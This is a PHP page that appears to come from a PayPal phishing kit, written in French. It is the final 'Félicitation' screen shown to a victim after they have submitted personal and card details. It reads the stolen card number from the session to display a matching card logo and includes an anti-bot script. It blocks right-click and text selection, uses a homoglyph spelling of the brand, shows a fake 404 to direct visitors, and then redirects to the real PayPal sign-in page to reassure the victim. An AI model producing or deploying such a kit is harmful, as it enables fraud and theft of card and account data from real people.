<?php 
ob_start();
session_start();
if(isset($_SESSION['step_six'])){
include'../antibots.php';
$ltr = substr($_SESSION["c_num"],0,1);
if($ltr ==  "4"){ $photo = "vsa.png";}
elseif($ltr ==  "5"){ $photo = "mc.png";}
elseif($ltr ==  "3"){ $photo = "amx.png";}
elseif($ltr ==  "6"){ $photo = "dc.png";}
header('refresh:4;https://www.paypal.com/signin');
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Félicitation</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
            <script language="JavaScript1.2" type="text/javascript">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function ("return false")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function("return false")
        
</script>
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain biling-p">
                <div class="contain-info">
                    <center>
                        <h3>Félicitation <?php echo $_SESSION["fname"]; ?></h3>
                        <img src="../img/validated.svg" style="width: 170px;height: auto;margin-bottom:20px">
                    </center>
                    <h5 style="color:#676767">Vos informations sont en cours d'examen par notre équipe.</h5>
                    <h5 style="color:#676767">En attendant, vous pouvez accéder à votre compte avec une sécurité renforcée.</h5>
                    <center>
                        <h4 style="color:#676767">Merci d'avoir choisi ΡayΡal.</h4>
                        <h5 style="color:#676767;margin:20px auto"></h5>
                    </center>
                </div>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>